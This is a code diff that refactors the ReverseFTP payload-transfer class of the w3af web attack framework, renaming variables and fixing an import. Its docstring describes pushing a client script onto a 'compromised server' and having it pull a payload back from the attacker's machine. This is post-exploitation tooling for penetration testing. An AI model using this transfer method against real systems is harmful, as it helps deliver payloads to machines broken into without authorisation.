@@ -21,7 +21,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 '''
 import socket
 
-from core.controllers.payload_transfer.payload_transfer import BasePayloadTransfer
+from core.controllers.payload_transfer.base_payload_transfer import BasePayloadTransfer
 
 
 class ReverseFTP(BasePayloadTransfer):
@@ -31,8 +31,8 @@ class ReverseFTP(BasePayloadTransfer):
     socket.send/socket.recv )
     '''
 
-    def __init__(self, execMethod, os, inboundPort):
-        self._execMethod = execMethod
+    def __init__(self, exec_method, os, inboundPort):
+        self._exec_method = exec_method
         self._os = os
         self._inbound_port = inboundPort
 
@@ -50,28 +50,30 @@ class ReverseFTP(BasePayloadTransfer):
         '''
         return int(3)
 
-    def _serve(self, strObject):
+    def _serve(self, data_str):
         '''
         Listens for 1 connection on the inbound port, transfers the data and
         then returns. This function should be called with tm.apply_async ; and
         afterwards you should exec the ftp client on the remote server.
         '''
-        serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        serverSock.bind(('', self._inbound_port))
-        serverSock.listen(1)
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.bind(('', self._inbound_port))
+        server_socket.listen(1)
 
-        clientSock, addr = serverSock.accept()
+        client_socket, addr = server_socket.accept()
 
-        clientSock.send(strObject)
-        clientSock.close()
+        #pylint: disable-msg=E1101
+        client_socket.send(data_str)
+        client_socket.close()
 
         return True
 
-    def transfer(self, strObject, destination):
+    def transfer(self, data_str, destination):
         '''
-        This method is used to transfer the strObject from w3af to the compromised server.
-        Steps:
-            - using EchoLinux / EchoWindows transfer the reverseFTPClient.py file (or the cx_freezed version)
+        This method is used to transfer the data_str from w3af to the
+        compromised server. Steps:
+            - using EchoLinux / EchoWindows transfer the reverseFTPClient.py
+              file (or the cx_freezed version)
             - start the _serve method
             - call the reverseFTPClient.py file on the remote server using:
                 - reverseFTPClient.py <w3af-ip-address> <port> <destination>
